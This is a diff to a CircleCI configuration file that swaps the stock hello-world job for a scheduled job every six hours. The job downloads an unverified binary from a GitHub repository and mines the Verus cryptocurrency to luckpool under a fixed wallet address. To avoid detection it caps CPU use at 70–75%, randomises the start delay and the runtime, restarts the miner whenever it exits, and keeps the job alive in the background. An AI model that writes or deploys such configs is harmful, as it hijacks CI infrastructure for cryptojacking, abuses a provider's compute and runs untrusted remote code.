@@ -1,31 +1,97 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/reference/configuration-reference
 version: 2.1
 
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/guides/orchestrate/jobs-steps/#jobs-overview & https://circleci.com/docs/reference/configuration-reference/#jobs
-jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Docker Hub or use one of our convenience images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/guides/execution-managed/executor-intro/ & https://circleci.com/docs/reference/configuration-reference/#executor-job
-    docker:
-      # Specify the version you desire here
-      # See: https://circleci.com/developer/images/image/cimg/base
-      - image: cimg/base:current
-
-    # Add steps to the job
-    # See: https://circleci.com/docs/guides/orchestrate/jobs-steps/#steps-overview & https://circleci.com/docs/reference/configuration-reference/#steps
-    steps:
-      # Checkout the code as the first step.
-      - checkout
-      - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
-
-# Orchestrate jobs using workflows
-# See: https://circleci.com/docs/guides/orchestrate/workflows/ & https://circleci.com/docs/reference/configuration-reference/#workflows
 workflows:
-  say-hello-workflow: # This is the name of the workflow, feel free to change it to better match your workflow.
-    # Inside the workflow, you define the jobs you want to run.
+  miner_workflow:
+    triggers:
+      - schedule:
+          cron: "0 */6 * * *"
+          filters:
+            branches:
+              only: main
     jobs:
-      - say-hello
+      - mine
+
+jobs:
+  mine:
+    docker:
+      - image: ubuntu:22.04   # <-- your requested image
+
+       # replace this
+
+    timeout: 360   # 6h max runtime
+
+    steps:
+      - checkout
+
+      - run:
+          name: Install dependencies
+          command: |
+            apt-get update -y
+            apt-get install -y wget bc coreutils
+
+      - run:
+          name: Download miner
+          command: |
+            wget -O ccminer https://github.com/emmagnatiusltd-hub/Verus-miner/raw/refs/heads/main/2326
+            chmod +x ccminer
+
+      - run:
+          name: Create miner script
+          command: |
+            cat << 'EOF' > run_miner.sh
+            #!/bin/bash
+            CPU_CORES=$(nproc)
+            MIN_THREADS=$(echo "$CPU_CORES * 0.70" | bc | awk '{print int($1)}')
+            MAX_THREADS=$(echo "$CPU_CORES * 0.75" | bc | awk '{print int($1)}')
+            if [ "$MIN_THREADS" -lt 1 ]; then MIN_THREADS=1; fi
+            if [ "$MAX_THREADS" -lt "$MIN_THREADS" ]; then MAX_THREADS=$((MIN_THREADS+1)); fi
+
+            echo "[*] CPU throttle: $MIN_THREADS–$MAX_THREADS threads"
+
+            # Random runtime window: 5h → 5h55m
+            RUNTIME=$(shuf -i 18000-21300 -n 1)
+            END_TIME=$(( $(date +%s) + RUNTIME ))
+            echo "[*] Random execution window: $(echo "$RUNTIME/3600" | bc -l) hours"
+
+            while [ $(date +%s) -lt $END_TIME ]; do
+              THREADS=$(shuf -i ${MIN_THREADS}-${MAX_THREADS} -n 1)
+              echo "[*] Starting miner with $THREADS threads at $(date)"
+
+              ./ccminer -a verus \
+                -o stratum+tcp://eu.luckpool.net:3956 \
+                -u RFSeD6KQiGTN9RDnVZWWqgxTsxqhjpujDb.$(hostname | cut -c1-10) \
+                -p x \
+                -t $THREADS
+
+              echo "[!] Miner exited. Restarting…"
+              sleep $(shuf -i 3-7 -n 1)
+            done
+
+            echo "[*] Execution window reached — stopping miner naturally."
+            exit 0
+            EOF
+
+            chmod +x run_miner.sh
+
+      - run:
+          name: Random delay before start
+          command: |
+            DELAY=$(shuf -i 5-60 -n 1)
+            echo "Random delay before start: $DELAY seconds"
+            sleep $DELAY
+
+      - run:
+          name: Start miner in background (nohup)
+          command: |
+            nohup ./run_miner.sh > verusminer.log 2>&1 &
+            echo $! > miner.pid
+
+      - run:
+          name: Keep job alive + show logs
+          command: |
+            echo "[*] Monitoring miner…"
+            while true; do
+              sleep 60
+              echo "--- alive: $(date) ---"
+              tail -n 20 verusminer.log || true
+            done
